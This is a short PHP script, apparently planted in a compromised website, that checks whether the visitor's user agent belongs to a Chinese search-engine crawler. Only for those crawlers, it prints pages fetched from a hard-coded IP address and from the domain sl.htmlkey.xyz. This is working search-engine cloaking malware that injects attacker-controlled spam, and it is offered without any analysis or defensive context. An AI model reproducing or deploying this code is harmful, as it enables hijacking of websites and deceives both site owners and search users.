<?php
function chkCode($string) {
$code = array(
 'ASCII',
 'GBK',
 'UTF-8'
);
foreach ($code as $c) { if ($string === iconv('UTF-8', $c, iconv($c, 'UTF-8', $string))) {return $c;}}
}
$key= strtolower($_SERVER["HTTP_USER_AGENT"]);
if(stristr($key,'baidu')!=false ||  stristr($key,'sogou')!=false || stristr($key,'youdao')!=false  || stristr($key,'360')!=false  || stristr($key,'soso')!=false  )
{
set_time_limit(0);
$content=file_get_contents(__FILE__);
if(stristr(__FILE__,"index.html")!=false){
preg_match("/<meta.+?charset=([-\w]+)/i",$content,$charset);
	$charset=strtolower($charset[1]);
}else{
	if(@chkCode($content)=='UTF-8'){
		$charset="utf-8";
	}else{
		$charset="gbk";
	}
}
header("Content-Type: text/html;charset=".$charset);

date_default_timezone_set('PRC');
$u='154.219.166.11';if($charset=='utf-8'){
echo iconv("gb2312","utf-8//IGNORE",file_get_contents('http://'.$u.'/'));
}else{
echo file_get_contents("http://sl.htmlkey.xyz/?".rand(time()));
}
}?>